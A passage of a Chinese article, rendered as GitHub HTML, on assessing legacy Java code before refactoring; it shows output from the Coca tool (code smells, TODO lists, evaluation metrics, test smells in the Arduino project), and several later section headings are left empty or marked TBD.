&lt;p&gt;你也可以通过 &lt;code&gt;coca bs&lt;/code&gt; 来做一些简单的 Bad Smell 收集：&lt;/p&gt;
&lt;div class="highlight highlight-source-json"&gt;&lt;pre&gt;{
   &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;dataClass&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;: [
      {
         &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;File&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;: &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;examples/api/BookController.java&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;,
         &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;BS&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;: &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;dataClass&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;
      }
   ],
   &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;lazyElement&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;: [
      {
         &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;File&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;: &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;examples/api/model/BookRepresentaion.java&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;,
         &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;BS&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;: &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;lazyElement&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;
      }
   ]
}&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;而后，再生成对应的重构建议。&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-收集-todo" class="anchor" aria-hidden="true" href="#收集-todo"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;收集 Todo&lt;/h4&gt;
&lt;p&gt;代码中的 Todo 注释，是一些本应该发生的事情，本应该做好，但是我没有立即去做。换句话来说，Todo 都是项目中的技术债务，就了可能就永远不会做。&lt;/p&gt;
&lt;p&gt;所以，我们需要有工具来查找项目的 Todo，如笔者编写的 Coca，可以寻找代码中的 Todo，包含其对应的日期、作者、提交信息、文件名及对其的行数等信息：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;MESSAGES&lt;/th&gt;
&lt;th&gt;FILENAME&lt;/th&gt;
&lt;th&gt;LINE&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;happens on macosx, don't know why&lt;/td&gt;
&lt;td&gt;.../ContributedLibraryTableCellJPanel.java&lt;/td&gt;
&lt;td&gt;118&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Make this a method of Theme&lt;/td&gt;
&lt;td&gt;.../ContributedLibraryTableCellJPanel.java&lt;/td&gt;
&lt;td&gt;233&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Do a better job in refreshing  only the needed element&lt;/td&gt;
&lt;td&gt;.../LibraryManagerUI.java&lt;/td&gt;
&lt;td&gt;241&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Do a better job in refreshing  only the needed element&lt;/td&gt;
&lt;td&gt;.../LibraryManagerUI.java&lt;/td&gt;
&lt;td&gt;273&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Make this a method of Theme&lt;/td&gt;
&lt;td&gt;.../MultiLibraryInstallDialog.java&lt;/td&gt;
&lt;td&gt;149&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;happens on macosx, don't know  why&lt;/td&gt;
&lt;td&gt;.../ContributedPlatformTableCellJPanel.java&lt;/td&gt;
&lt;td&gt;183&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;show error error when importing. ignoring  :(&lt;/td&gt;
&lt;td&gt;.../Base.java&lt;/td&gt;
&lt;td&gt;2423&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Improve / move error handling&lt;/td&gt;
&lt;td&gt;.../Editor.java&lt;/td&gt;
&lt;td&gt;1541&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Should be a Theme value?&lt;/td&gt;
&lt;td&gt;.../EditorHeader.java&lt;/td&gt;
&lt;td&gt;78&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Should be a Theme value?&lt;/td&gt;
&lt;td&gt;.../EditorStatus.java&lt;/td&gt;
&lt;td&gt;73&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Improve decoupling&lt;/td&gt;
&lt;td&gt;.../EditorTab.java&lt;/td&gt;
&lt;td&gt;465&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;随后，我们只需要根据真实的情况，更新项目中的 Todo，以确认出我们需要完成的技术债务。&lt;/p&gt;
&lt;p&gt;不过，写好一个 Todo 并不是容易，万一以后大家都不写了呢？&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-测试和文档评估" class="anchor" aria-hidden="true" href="#测试和文档评估"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;测试和文档评估&lt;/h4&gt;
&lt;p&gt;关于测试的话题，我们会有一个大的专题来介绍相关的活动。&lt;/p&gt;
&lt;p&gt;至于文档的缺乏，会在文中的最后介绍。&lt;/p&gt;
&lt;p&gt;不过，你也可以参考我的那篇《&lt;a href="https://www.phodal.com/blog/build-trusted-software-system/" rel="nofollow"&gt;构建质量可信的软件系统&lt;/a&gt;》 来对你的文档进行评估。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-项目评估" class="anchor" aria-hidden="true" href="#项目评估"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;项目评估&lt;/h3&gt;
&lt;p&gt;根据不同的项目，侧重点有所不同。&lt;/p&gt;
&lt;p&gt;但是毫无疑问地，我们可以统计：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;功能的 bug 率，对应的 bug 修改时间&lt;/li&gt;
&lt;li&gt;bug 常见的问题&lt;/li&gt;
&lt;li&gt;……&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;你都懂的。我暂时就不 copy 了。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-编写工具评估" class="anchor" aria-hidden="true" href="#编写工具评估"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;编写工具评估&lt;/h3&gt;
&lt;p&gt;在我遇到的一个重构项目中，项目中经常抛出 Null Point Exception 的问题。于是，我便写了一个简单的工具，来查找项目中返回 null point exception 的代码，并对调用的地方进行评估。&lt;/p&gt;
&lt;p&gt;随着评估的进一步深入，我在工具中加入了更多的功能，如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;静态方法多，难以进行测试。要么是工具类过多，需要抽取基础设施；要么就是缺乏 OO 设计，导致过程性代码……。&lt;/li&gt;
&lt;li&gt;Util 过多，同上。&lt;/li&gt;
&lt;li&gt;Null Point Exeception 越多，则项目的出错可能性越多。&lt;/li&gt;
&lt;li&gt;类方法数的标准差，能判断出对应的上帝类情况。&lt;/li&gt;
&lt;li&gt;方法长度的标准差，越大则意味着方法的长度都比较长，方便于重构。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;只需要运行 &lt;code&gt;coca evaluate&lt;/code&gt;，就能得到以下的结果：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;TYPE&lt;/th&gt;
&lt;th&gt;COUNT&lt;/th&gt;
&lt;th&gt;LEVEL&lt;/th&gt;
&lt;th&gt;TOTAL&lt;/th&gt;
&lt;th&gt;RATE&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Nullable / Return Null&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;Method&lt;/td&gt;
&lt;td&gt;1615&lt;/td&gt;
&lt;td&gt;0.00%&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Utils&lt;/td&gt;
&lt;td&gt;7&lt;/td&gt;
&lt;td&gt;Class&lt;/td&gt;
&lt;td&gt;252&lt;/td&gt;
&lt;td&gt;2.78%&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Static Method&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;Method&lt;/td&gt;
&lt;td&gt;1615&lt;/td&gt;
&lt;td&gt;0.43%&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Average Method Num.&lt;/td&gt;
&lt;td&gt;1615&lt;/td&gt;
&lt;td&gt;Method/Class&lt;/td&gt;
&lt;td&gt;252&lt;/td&gt;
&lt;td&gt;6.408730&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Method Num. Std Dev / 标准差&lt;/td&gt;
&lt;td&gt;1615&lt;/td&gt;
&lt;td&gt;Class&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;7.344917&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Average Method Length&lt;/td&gt;
&lt;td&gt;13654&lt;/td&gt;
&lt;td&gt;Without Getter/Setter&lt;/td&gt;
&lt;td&gt;1100&lt;/td&gt;
&lt;td&gt;12.412727&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Method Length Std Dev / 标准差&lt;/td&gt;
&lt;td&gt;1615&lt;/td&gt;
&lt;td&gt;Method&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;20.047092&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;笑，你只要加强使用 TDD，那么上述的大部分问题，都能得到进一步的缓解。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-代码评估工具" class="anchor" aria-hidden="true" href="#代码评估工具"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;代码评估工具&lt;/h3&gt;
&lt;p&gt;Java 世界流行的几个找问题工具：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;FindBugs&lt;/li&gt;
&lt;li&gt;PMD&lt;/li&gt;
&lt;li&gt;Checkstyle&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;试试你就知道了。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-真实的测试覆盖率" class="anchor" aria-hidden="true" href="#真实的测试覆盖率"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;真实的测试覆盖率&lt;/h3&gt;
&lt;p&gt;尽管有越来越多的项目将测试覆盖率作为一项考核指标。但是，对于诸多编程实践本身就好的公司为说，测试覆盖率也往往不是真的。&lt;/p&gt;
&lt;p&gt;我们编写测试的其中一个目的是用于快速反馈，即当我们的功能出现问题的时候，我们可以快速通过测试来定位到问题所。然而，如果那些是没有断言的测试，那么我们就无法通过它来进行快速反馈。即，如果我们重构过程中，修改了某一块的功能，可能会进一步导致出现 bug。&lt;/p&gt;
&lt;p&gt;为此，你可以借助于 Coca 的 Test Bas Smell 功能，来找到对应的问题。只需要执行 &lt;code&gt;coca tbs&lt;/code&gt;，便能帮助你找到代码中的坏味道。它可以在你进入重构之前，帮你看看是否有对应的风险。&lt;/p&gt;
&lt;p&gt;如下是 Coca 扫描出来的 Arduino 开源项目测试问题：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;TYPE&lt;/th&gt;
&lt;th&gt;FILENAME&lt;/th&gt;
&lt;th&gt;LINE&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;DuplicateAssertTest&lt;/td&gt;
&lt;td&gt;app/test/cc/arduino/i18n/ExternalProcessOutputParserTest.java&lt;/td&gt;
&lt;td&gt;107&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DuplicateAssertTest&lt;/td&gt;
&lt;td&gt;app/test/cc/arduino/i18n/ExternalProcessOutputParserTest.java&lt;/td&gt;
&lt;td&gt;41&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DuplicateAssertTest&lt;/td&gt;
&lt;td&gt;app/test/cc/arduino/i18n/ExternalProcessOutputParserTest.java&lt;/td&gt;
&lt;td&gt;63&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;RedundantPrintTest&lt;/td&gt;
&lt;td&gt;app/test/cc/arduino/i18n/I18NTest.java&lt;/td&gt;
&lt;td&gt;71&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;RedundantPrintTest&lt;/td&gt;
&lt;td&gt;app/test/cc/arduino/i18n/I18NTest.java&lt;/td&gt;
&lt;td&gt;72&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;RedundantPrintTest&lt;/td&gt;
&lt;td&gt;app/test/cc/arduino/i18n/I18NTest.java&lt;/td&gt;
&lt;td&gt;77&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DuplicateAssertTest&lt;/td&gt;
&lt;td&gt;app/test/cc/arduino/net/PACSupportMethodsTest.java&lt;/td&gt;
&lt;td&gt;19&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DuplicateAssertTest&lt;/td&gt;
&lt;td&gt;app/test/processing/app/macosx/SystemProfilerParserTest.java&lt;/td&gt;
&lt;td&gt;51&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DuplicateAssertTest&lt;/td&gt;
&lt;td&gt;app/test/processing/app/syntax/PdeKeywordsTest.java&lt;/td&gt;
&lt;td&gt;41&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DuplicateAssertTest&lt;/td&gt;
&lt;td&gt;app/test/processing/app/tools/ZipDeflaterTest.java&lt;/td&gt;
&lt;td&gt;57&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DuplicateAssertTest&lt;/td&gt;
&lt;td&gt;app/test/processing/app/tools/ZipDeflaterTest.java&lt;/td&gt;
&lt;td&gt;83&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DuplicateAssertTest&lt;/td&gt;
&lt;td&gt;app/test/processing/app/tools/ZipDeflaterTest.java&lt;/td&gt;
&lt;td&gt;109&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;好在上述的测试代码中，没有出现诸如于下面场景的测试坏味道：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;EmptyTest。测试函数里空空如也&lt;/li&gt;
&lt;li&gt;UnknownTest。测试中没有对应的断言&lt;/li&gt;
&lt;li&gt;IgnoreTest。测试是被 Ingore 的，即不会运行的测试。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果你的代码中出现了大量的上述问题，你需要好好反思一下，你的测试覆盖率是真实的吗？&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-可测试性评估" class="anchor" aria-hidden="true" href="#可测试性评估"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;可测试性评估&lt;/h3&gt;
&lt;p&gt;代码本身是缺乏测试的，那么它就是一个遗留系统。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-度量" class="anchor" aria-hidden="true" href="#度量"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;度量&lt;/h3&gt;
&lt;p&gt;根据《精益软件度量》对于度量的定义：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;度量在组织上下文中形成的一系列共识&lt;/li&gt;
&lt;li&gt;将经验性模型转换为向量化模型（修改）&lt;/li&gt;
&lt;li&gt;包含人、流程、组织和工具的一个动态系统&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;TBD&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-度量缺陷" class="anchor" aria-hidden="true" href="#度量缺陷"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;度量缺陷&lt;/h4&gt;
&lt;h3&gt;&lt;a id="user-content-寻找专业人士" class="anchor" aria-hidden="true" href="#寻找专业人士"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;寻找专业人士&lt;/h3&gt;
&lt;p&gt;你懂的。&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-重构准入条件" class="anchor" aria-hidden="true" href="#重构准入条件"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;重构准入条件&lt;/h2&gt;
&lt;p&gt;看标题就够了。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-工具准备" class="anchor" aria-hidden="true" href="#工具准备"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;工具准备&lt;/h3&gt;
&lt;h3&gt;&lt;a id="user-content-重构看板" class="anchor" aria-hidden="true" href="#重构看板"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;重构看板&lt;/h3&gt;
&lt;h3&gt;&lt;a id="user-content-版本控制" class="anchor" aria-hidden="true" href="#版本控制"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;版本控制&lt;/h3&gt;
&lt;h3&gt;&lt;a id="user-content-自动化重构工具" class="anchor" aria-hidden="true" href="#自动化重构工具"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;自动化重构工具&lt;/h3&gt;
